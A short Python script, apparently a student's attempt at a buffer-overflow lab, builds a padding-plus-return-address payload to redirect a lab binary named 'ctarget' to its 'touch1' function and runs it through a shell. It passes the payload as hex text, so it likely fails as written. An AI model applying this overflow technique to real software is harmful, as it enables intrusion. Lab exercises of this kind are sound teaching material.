import subprocess
import struct

buffer_size = 40  # Replace with the actual buffer size
touch1_addr = 0x40195d  # Replace with the actual touch1 address

print("1\n")

# Calculate the input length and create the exploit string
input_length = buffer_size + 8  # Assuming 8 bytes for the extra space

print("input_length:",input_length,"\n")

exploit_str = b'A' * input_length
exploit_str += struct.pack('<Q', touch1_addr)

print("exploit_str:",exploit_str,"\n")

# Print the exploit string
print(f'Exploit string: {exploit_str.hex()}')

# Run the ctarget program with the exploit string as input
cmd = f'bash -c "./ctarget <<< {exploit_str.hex()}"'
process = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)

# Print the output of the ctarget program
print('Output:')
print(process.stdout)
print('Error:')
print(process.stderr)
